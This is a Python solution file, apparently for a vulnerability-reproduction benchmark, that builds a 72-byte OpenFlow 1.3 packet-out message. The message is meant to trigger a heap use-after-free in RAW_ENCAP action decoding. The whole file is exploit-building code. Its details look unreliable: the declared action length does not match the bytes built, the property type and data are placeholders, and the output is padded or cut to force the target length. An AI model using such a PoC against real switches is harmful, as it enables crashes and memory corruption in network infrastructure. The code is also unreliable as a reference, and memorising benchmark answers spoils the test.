import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground-truth PoC length is 72 bytes
        # Constructing a PoC that triggers heap use-after-free in RAW_ENCAP decoding
        # This is based on the vulnerability description in ofp-actions.c
        
        # OpenFlow 1.3 packet-out message structure
        # We'll create a minimal message that triggers the vulnerability
        
        # Message structure:
        # 1. OpenFlow header (8 bytes)
        # 2. Packet-out header (16 bytes)
        # 3. Actions with RAW_ENCAP that causes reallocation
        
        # Constants
        OFP_VERSION = 0x04  # OpenFlow 1.3
        OFPT_PACKET_OUT = 13
        OFPAT_EXPERIMENTER = 0xffff
        NX_EXPERIMENTER_ID = 0x00002320  # Nicira
        NXAST_RAW_ENCAP = 0x0005
        
        # Build the PoC
        poc = bytearray()
        
        # 1. OpenFlow header (8 bytes)
        # version(1), type(1), length(2), xid(4)
        total_length = 72
        xid = 0x12345678
        poc.extend(struct.pack('!BBHI', OFP_VERSION, OFPT_PACKET_OUT, total_length, xid))
        
        # 2. Packet-out header (16 bytes)
        # buffer_id(4), in_port(4), actions_len(2), pad(6)
        buffer_id = 0xffffffff  # OFP_NO_BUFFER
        in_port = 0
        actions_len = 48  # Will be calculated
        poc.extend(struct.pack('!IIH', buffer_id, in_port, actions_len))
        poc.extend(b'\x00' * 6)  # Padding
        
        # 3. Actions
        # First action: RAW_ENCAP
        # ofp_action_experimenter_header: type(2), len(2), experimenter(4)
        # nx_action_encap: type(2), len(2), ethertype(2), pad(2)
        # Followed by encapsulated packet and properties
        
        # Experimenter action header
        action_type = OFPAT_EXPERIMENTER
        action_len = 48  # Total length of this action
        poc.extend(struct.pack('!HHI', action_type, action_len, NX_EXPERIMENTER_ID))
        
        # RAW_ENCAP action header
        nx_action_type = NXAST_RAW_ENCAP
        nx_action_len = 40  # 8 (header) + 14 (encap) + 18 (property that causes realloc)
        ethertype = 0x0800  # IPv4
        poc.extend(struct.pack('!HHH', nx_action_type, nx_action_len, ethertype))
        poc.extend(b'\x00' * 2)  # Padding
        
        # Encapsulated packet (minimal Ethernet frame without FCS)
        # dst(6), src(6), ethertype(2)
        encapsulated = b'\x00' * 14  # Minimal Ethernet frame
        poc.extend(encapsulated)
        
        # Property that will trigger reallocation in decode_ed_prop()
        # The property needs to be large enough to cause buffer reallocation
        # Property header: type(2), len(2)
        prop_type = 0x0000  # Some property type
        prop_len = 0x0010  # 16 bytes total (4 header + 12 data)
        poc.extend(struct.pack('!HH', prop_type, prop_len))
        
        # Property data - crafted to trigger the vulnerability
        # This data should cause decode_ed_prop() to reallocate the buffer
        property_data = b'A' * 12  # Fill with data that triggers the bug
        poc.extend(property_data)
        
        # Add padding to reach exact 72 bytes
        current_len = len(poc)
        if current_len < total_length:
            poc.extend(b'\x00' * (total_length - current_len))
        elif current_len > total_length:
            poc = poc[:total_length]
        
        return bytes(poc)
